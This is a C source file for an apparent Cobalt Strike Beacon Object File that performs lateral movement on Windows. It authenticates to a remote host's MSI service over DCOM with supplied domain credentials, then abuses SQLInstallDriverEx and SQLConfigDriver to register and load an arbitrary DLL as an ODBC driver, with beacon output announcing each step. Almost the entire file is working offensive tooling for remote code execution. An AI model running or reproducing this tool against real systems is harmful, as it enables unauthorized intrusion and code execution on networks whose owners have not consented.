// msi_lateral_mv.c
#include <windows.h>
#include <unknwn.h>
#include "beacon.h"
#include "bofdefs.h"
#include "msilat.c"


    COAUTHINFO* set_auth(PWSTR domain, PWSTR username, PWSTR password) {
        COAUTHINFO* authInfo = (COAUTHINFO*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
        COAUTHIDENTITY* authidentity = NULL;

        if (username && *username) {
            authidentity = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));

            authidentity->User = (USHORT*)username;
            authidentity->Password = (USHORT*)password;
            authidentity->Domain = (USHORT*)domain;

            if (username && *username) {
                authidentity->UserLength = MSVCRT$wcslen(username);
            }
            if (password && *password) {
                authidentity->PasswordLength = MSVCRT$wcslen(password);
            }
            if (domain && *domain) {
                authidentity->DomainLength = MSVCRT$wcslen(domain);
            }

            authidentity->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
        }

        authInfo->dwAuthnSvc = RPC_C_AUTHN_WINNT;
        authInfo->dwAuthzSvc = RPC_C_AUTHZ_NONE;
        authInfo->pwszServerPrincName = NULL;
        authInfo->dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY;
        authInfo->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
        authInfo->pAuthIdentityData = authidentity;
        authInfo->dwCapabilities = EOAC_NONE;

        return authInfo;
    }
#ifdef BOF

void free_auth(COAUTHINFO* pAuth) {
    if (pAuth) {
        if (pAuth->pAuthIdentityData) {
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pAuth->pAuthIdentityData);
        }
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pAuth);
    }
}

void go(char* args, int argc) {
    HRESULT hr = S_OK;
    // TODO better argument parsing
    datap parser = {0};
    BeaconDataParse(&parser, args, argc);

    ParsedArgs parsedArgs = ParseBOFArguments(&parser, &argc);
    
    if (!parsedArgs.isValid) {
        return;
    }
    
    if (parsedArgs.isRemote) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting lateral movement to %ls as %ls\\%ls\n", 
                     parsedArgs.hostname ? parsedArgs.hostname : L"(null)", 
                     parsedArgs.domain ? parsedArgs.domain : L"(null)", 
                     parsedArgs.username ? parsedArgs.username : L"(null)");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting local execution as %ls\\%ls\n", 
                     parsedArgs.domain ? parsedArgs.domain : L"(null)", 
                     parsedArgs.username ? parsedArgs.username : L"(null)");
    }

    // Init COAUTHINFO
    COAUTHINFO* pAuth = set_auth(parsedArgs.domain, parsedArgs.username, parsedArgs.password);
    IUnknown* pIMsiServerAuthd = NULL;
    hr = auth_msi_server(pAuth, parsedArgs.hostname, &pIMsiServerAuthd);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] auth_msi_server failed: 0x%08X\n", hr);
        free_auth(pAuth);
        OLE32$CoUninitialize();
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Authenticated MSI server @ %p\n", (void*)pIMsiServerAuthd);

    IMsiCustomAction* authedAction = NULL;
    hr = get_custom_action_server(pIMsiServerAuthd, &authedAction, pAuth);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] auth_msi_server failed: 0x%08X\n", hr);
        free_auth(pAuth);
        pIMsiServerAuthd->lpVtbl->Release(pIMsiServerAuthd);
        OLE32$CoUninitialize();
        return;
    }

    
    int rawReturnCode = 0;
    DWORD usage_count = 0;
    DWORD error_code = 0;
    WCHAR error_msg[256] = { 0 };
    WCHAR path_out[256] = { 0 };
    WORD path_out_len = 0;
    WORD error_msg_len = 0;

    LPCWSTR driverDLL = SHLWAPI$PathFindFileNameW(parsedArgs.dllpath);
    WCHAR path[MAX_PATH];
    MSVCRT$wcscpy(path, parsedArgs.dllpath);
    SHLWAPI$PathRemoveFileSpecW(path);

    BeaconPrintf(CALLBACK_OUTPUT, "[-] DLL Path is %ls\n", path);
    BeaconPrintf(CALLBACK_OUTPUT, "[-] DLL Filename is %ls\n", driverDLL);

    // Build each component separately
    WCHAR section1[256], section2[256], section3[256];
    USER32$wsprintfW(section1, L"%ls", parsedArgs.drivername);
    USER32$wsprintfW(section2, L"Driver=%ls", driverDLL);
    USER32$wsprintfW(section3, L"Setup=%ls", driverDLL);

    int driver_len = MSVCRT$wcslen(section1) + 1 + MSVCRT$wcslen(section2) + 1 + MSVCRT$wcslen(section3) + 1 + 1;

    // Build the final string
    WCHAR driver_info[512];
    PWSTR pos = driver_info;
    MSVCRT$wcscpy(pos, section1); pos += MSVCRT$wcslen(section1) + 1;
    MSVCRT$wcscpy(pos, section2); pos += MSVCRT$wcslen(section2) + 1;  
    MSVCRT$wcscpy(pos, section3); pos += MSVCRT$wcslen(section3) + 1;
    *pos = '\0';

    BeaconPrintf(CALLBACK_OUTPUT, "[-] Calling SQLInstallDriverEx\n");
    hr = authedAction->lpVtbl->SQLInstallDriverEx(
        authedAction,                       // thiz
        driver_len,                         // cDrvLen
        driver_info,                        // szDriver
        path,                               // szPathIn
        path_out,                           // szPathOut
        sizeof(path_out) / sizeof(WCHAR),   // cbPathOutMax
        &path_out_len,                      // pcbPathOut
        2,                                  // ODBC_INSTALL_COMPLETE
        &usage_count,                       // pdwUsageCount
        &rawReturnCode                      // rawReturnCode
        );

    if (FAILED(hr) || rawReturnCode == 0) {
        BeaconPrintf(CALLBACK_ERROR, "SQLInstallDriverEx failed. HRESULT: 0x%x, ReturnCode: %d\n", hr, rawReturnCode);
        authedAction->lpVtbl->SQLInstallerError(authedAction, 1, &error_code, error_msg,
            sizeof(error_msg) / sizeof(WCHAR), &error_msg_len);
        BeaconPrintf(CALLBACK_ERROR, "Error message: %s\n", error_msg);
        free_auth(pAuth);
        authedAction->lpVtbl->Release(authedAction);
        pIMsiServerAuthd->lpVtbl->Release(pIMsiServerAuthd);
        OLE32$CoUninitialize();
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[$] Driver installed successfully. Usage count: %d\n", usage_count);
    BeaconPrintf(CALLBACK_OUTPUT, "[-] Driver path: %ls\n", path_out);

    BeaconPrintf(CALLBACK_OUTPUT, "[-] Calling SQLConfigDriver\n");

    int configResult = 0;
    WORD msgOutLen = 0;
    hr = authedAction->lpVtbl->SQLConfigDriver(
        authedAction,                           // thizzface
        1,                                      // ODBC_INSTALL_DRIVER
        parsedArgs.drivername,                  // szDriver
        NULL,                                   // szArgs
        error_msg,                              // szMsg
        sizeof(error_msg) / sizeof(WCHAR),      // cbMsgMax
        &msgOutLen,
        &configResult
    );

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SQLConfigDriver failed. HRESULT: 0x%x\n", hr);
        authedAction->lpVtbl->SQLInstallerError(authedAction, 1, &error_code, error_msg,
            sizeof(error_msg) / sizeof(WCHAR), &error_msg_len);
        BeaconPrintf(CALLBACK_ERROR, "[!] Error message: %s\n", error_msg);
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[LFG] Driver configured successfully\n");
    }
    // Cleanup
    free_auth(pAuth);
    authedAction->lpVtbl->Release(authedAction);
    pIMsiServerAuthd->lpVtbl->Release(pIMsiServerAuthd);
    OLE32$CoUninitialize();
}

#else

int main(char* args, int argc)
{

}

#endif
